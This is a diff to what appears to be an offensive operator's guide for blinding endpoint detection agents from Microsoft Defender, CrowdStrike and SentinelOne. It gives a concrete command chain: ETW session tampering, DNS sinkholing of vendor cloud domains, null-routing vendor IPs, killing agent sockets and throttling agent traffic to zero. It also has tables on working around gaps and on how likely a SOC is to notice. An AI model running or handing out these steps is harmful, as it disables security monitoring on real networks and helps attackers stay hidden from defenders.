@@ -277,8 +277,13 @@ nrpt_sinkhole *.endpoint.microsoft.com;*.wdcp.microsoft.com;*.ods.opinsights.azu
 #   (resolve MsSense.exe's current connections first: netstat -anob | findstr MsSense)
 null_route 20.190.128.1;20.190.129.1;52.183.20.1;13.89.176.1
 
-# Step 4: Apply QoS cap as failsafe (covers any IP/domain we missed)
-edrchoker MsSense.exe;MsSenseS.exe;SenseNdr.exe
+# Step 4: Kill existing connections
+#   NOTE: MsSense.exe runs as PPL-Antimalware — PROCESS_DUP_HANDLE is denied.
+#   Skip sock_kill for MDE; existing session will drop naturally, reconnects are
+#   permanently blocked by NRPT + null_route above.
+
+# Step 5: Apply QoS cap as failsafe (covers any IP/domain we missed)
+edrchoker_v2 add "MsSense.exe;MsSenseS.exe;SenseNdr.exe"
 ```
 
 **What this achieves:**
@@ -318,8 +323,12 @@ nrpt_sinkhole *.falcon.crowdstrike.com;*.cloudsink.net;*.crowdstrike.com
 #   (use: Resolve-DnsName ts01-b.cloudsink.net to get current IPs first)
 null_route 35.232.0.1;34.102.200.1;34.102.201.1
 
-# Step 4: QoS throttle as failsafe
-edrchoker CSFalconService.exe;CSFalconContainer.exe
+# Step 4: Kill existing connections
+#   NOTE: CSFalconService.exe runs as PPL-Antimalware — PROCESS_DUP_HANDLE is denied.
+#   Skip sock_kill for CrowdStrike; use NRPT + null_route to starve reconnects.
+
+# Step 5: QoS throttle as failsafe
+edrchoker_v2 add "CSFalconService.exe;CSFalconContainer.exe"
 ```
 
 **Expected CrowdStrike behavior after chain:**
@@ -352,8 +361,11 @@ nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net
 #   (use: Resolve-DnsName usea1.pax.sentinelone.net to get current IPs)
 null_route 54.80.0.1;3.213.0.1;3.214.0.1
 
-# Step 4: QoS throttle as failsafe
-edrchoker SentinelAgent.exe;SentinelServiceHost.exe
+# Step 4: Kill existing connections (SentinelOne is non-PPL — sock_kill works)
+sock_kill kill SentinelAgent.exe;SentinelServiceHost.exe
+
+# Step 5: QoS throttle as failsafe
+edrchoker_v2 add "SentinelAgent.exe;SentinelServiceHost.exe"
 ```
 
 **Expected SentinelOne behavior after chain:**
@@ -395,13 +407,15 @@ Console shows agent as "Disconnected" and policy sync fails.
 | EDR console alert | Many EDR vendors detect ETW-TI session loss server-side (they see telemetry stop) and generate a "sensor disconnected" alert. | This is a tradeoff: local detection is stopped, but the SOC may be alerted. In time-sensitive operations, accept this risk. |
 | New session names | Vendor may use undocumented session names that are not in the default list. | Use `logman query` or `etwtrace list` to enumerate running sessions first, then pass custom names to the BOF. |
 
-### edrchoker Gaps (existing BOF, documented for completeness)
+### edrchoker_v2 Gaps
 
 | Risk | Description | Mitigation |
 |------|-------------|------------|
-| QoS bypass | Some processes bypass QoS by using raw sockets or by calling at elevated priority. | Unlikely for standard EDR agents that use WinHTTP / WinSock. |
-| WMI watchdog detection | WMI permanent subscriptions are a well-known persistence mechanism and are monitored by many EDRs. | Apply ETW tamper before installing watchdog. |
-| Policy scope | `AppPathNameMatchCondition` matches on process name only (not full path). A process renamed to `MsSense.exe` would also be throttled. | Accept this side effect or add path matching if available. |
+| Helper process spawned | If the EDR forks a child with a different name for telemetry upload (e.g. `SenseNdr.exe` from `MsSense.exe`), only the parent is throttled. Child communicates freely. | Enumerate child process names (`tasklist /fi "imagename eq Sense*"`) and add all to the throttle list. |
+| Kernel-mode NDIS driver | If the EDR kernel component sends data via a direct NDIS protocol driver (not through `tcpip.sys`), `pacer.sys` cannot identify the owning process — throttle does not apply. | Combine with `null_route` to block at the routing layer regardless of who sends. |
+| EDR routes through system process | If the EDR uses BITS (`svchost.exe`) or WinHTTP service as an upload proxy, the socket owner is `svchost.exe`, not the EDR process. Cannot throttle `svchost` without affecting all hosted services. | Use `null_route` to block cloud IPs at the routing layer. |
+| Policy scope | `AppPathNameMatchCondition` matches on process name only (not full path). Any process named `MsSense.exe` is throttled. | Accept this side effect — no false positives in practice. |
+| Psched not running | If the `Psched` service is stopped or disabled, policies are written to WMI but `pacer.sys` is not loaded — no enforcement. | Run `edrchoker_v2 check` to verify Psched state before relying on throttle. |
 
 ### Combined Chain Risk Summary
 
@@ -421,9 +435,9 @@ Console shows agent as "Disconnected" and policy sync fails.
                      session stop;      events)          session itself)
                      SOC alert likely)
 
-  edrchoker          MEDIUM             HIGH            HIGH (delete WMI
-                     (WMI subscription  (0 throughput)   subscription)
-                     is detectable)
+  edrchoker_v2       LOW                HIGH            HIGH (run
+                     (WMI policy write; (0 throughput)   remove_all)
+                     no subscription)
   ──────────────────────────────────────────────────────────────────────
 ```
 
@@ -431,7 +445,8 @@ Console shows agent as "Disconnected" and policy sync fails.
 1. `etw_tamper` first — reduce EDR's local monitoring before other changes
 2. `nrpt_sinkhole` — block DNS before EDR can make new connections
 3. `null_route` — block hardcoded IPs
-4. `edrchoker` — failsafe throughput cap on any connections that leak through
+4. `sock_kill` — RST any connections already open (non-PPL targets only)
+5. `edrchoker_v2` — failsafe throughput cap on any connections that leak through
 
 This order minimizes the window during which the EDR is partially impaired
 but still able to detect and report the impairment activity.
